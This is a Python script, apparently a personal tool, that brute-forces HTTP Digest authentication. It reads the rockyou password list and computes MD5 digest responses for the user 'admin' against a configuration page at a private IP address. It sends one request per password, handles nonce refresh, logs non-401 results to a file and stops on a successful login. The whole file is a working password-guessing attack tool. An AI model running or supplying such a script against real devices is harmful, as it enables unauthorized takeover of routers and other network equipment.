import hashlib
import re
import requests
import secrets


# proud of this one
def md5(*args) -> str:
    string = ':'.join(str(x) for x in args)
    return hashlib.md5(string.encode()).hexdigest()


def log(request, password, counter):
    print(f'\n\n Status {request.status_code} detected: used \"{password}\" and counter at {counter}')
    # writes results to a file
    with open('results.txt', 'a') as results:
        results.write(f'Password: {password}\nCounter: {counter}\nStatus: {request.status_code}\n\n')
        # only ends on a 2xx sucessful auth
    if 200 <= request.status_code < 300:
        print('Exiting')
        exit()


def hashes(user, realm, password, method, uri, nonce, nc, cnonce, qop) -> str:
    h1 = md5(user, realm, password)
    h2 = md5(method, uri)
    response = md5(h1, nonce, nc, cnonce, qop, h2)
    return response


reg = re.compile('(\w+)[:=] ?"?(\w+)"?')


def parse_authheaders(authheader) -> str:
    authheaders_dict = dict(reg.findall(authheader))
    nonce = authheaders_dict['nonce']
    return nonce


def main() -> None:
    # manual progress tracking, I know
    total = 0

    url = 'http://172.16.1.1/configure'
    # url = 'https://jigsaw.w3.org/HTTP/Digest/'

    # customizable, don't know how to read headers and extract these on the fly because they're not json or dictionaries
    user = 'admin'
    uri = '/configure'
    method = 'HEAD'
    qop = 'auth'
    filename = 'rockyou_utf8.txt'

    with open(filename) as file:
        passwords = [line.rstrip() for line in file]
    print(len(passwords), 'passwords loaded')

    if total > len(passwords):
        print('Total is greater then amount of passwords, please change')
        exit()

    # get a new nonce to start the chain
    # get realm from header, has problems with '@' for some reason, have to look into that
    request = requests.head(url)
    realm_dict = dict(reg.findall(request.headers['www-authenticate']))
    realm = realm_dict['realm']
    print('realm is', realm)
    nonce = parse_authheaders(request.headers['www-authenticate'])

    for i in range(total, len(passwords)):
        cnonce = secrets.token_hex(8)
        response = hashes(user, realm, passwords[i], method, uri, nonce, '00000001', cnonce, qop)
        header = {
            'Authorization': f'Digest username="{user}", realm="{realm}", nonce="{nonce}", uri="{uri}", algorithm=MD5, response="{response}", qop={qop}, nc="00000001", cnonce="{cnonce}"'
        }
        request = requests.head(url, headers=header)
        # triggers on status codes other than 200 but i'd want to know about those, too
        if request.status_code != 401:
            log(request, passwords[i], i)
            # new nonces are only given on 401's, so we have to make another request for one
            request = requests.head(url)

        nonce = parse_authheaders(request.headers['www-authenticate'])

        # if i % 100 == 0:
        #     print(i, end=', ')
        # print(request.request.headers)
        print(i, passwords[i], request.status_code)
        # print(nonce)

    print('La fin.')


if __name__ == '__main__':
    main()
